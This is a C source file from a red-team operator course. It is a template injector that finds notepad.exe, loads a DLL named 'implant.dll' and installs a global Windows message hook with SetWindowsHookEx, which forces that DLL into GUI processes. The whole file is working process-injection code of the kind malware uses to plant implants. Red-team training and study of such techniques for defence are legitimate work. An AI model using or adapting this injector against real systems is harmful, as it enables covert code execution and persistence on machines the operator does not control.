/*

 Red Team Operator course code template
 Global hooks: SetWindowsHookEx - injector template 
 
 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")


int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

int FindThreadID(int pid){

    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid)  {
			tid = thEntry.th32ThreadID;
			break;
		}
	}
	CloseHandle(Snap);
	
	return tid;
}


int main(void) {
    
	int tid = 0;
    HANDLE hProc = NULL;
	HANDLE hThread = NULL;
	
	tid = FindThreadID(FindTarget("notepad.exe"));
	printf("TID = %d\n", tid);
	
	if (tid) {
		HMODULE hLib = LoadLibrary("implant.dll");
		HOOKPROC hHookProc = (HOOKPROC) GetProcAddress(hLib, "Dummy"); 
		//HHOOK hDebugHook = SetWindowsHookEx(WH_GETMESSAGE, hHookProc, hLib, tid);
		//PostThreadMessageW(tid, WM_RBUTTONDOWN, (WPARAM) 0, (LPARAM) 0);
		HHOOK hDebugHook = SetWindowsHookEx(WH_GETMESSAGE, hHookProc, hLib, 0);
		
		//Sleep(10000);
		printf("Check PH...\n"); getchar();
		
		UnhookWindowsHookEx(hDebugHook);
		return 0;
	}
	else 
		return -1;
}
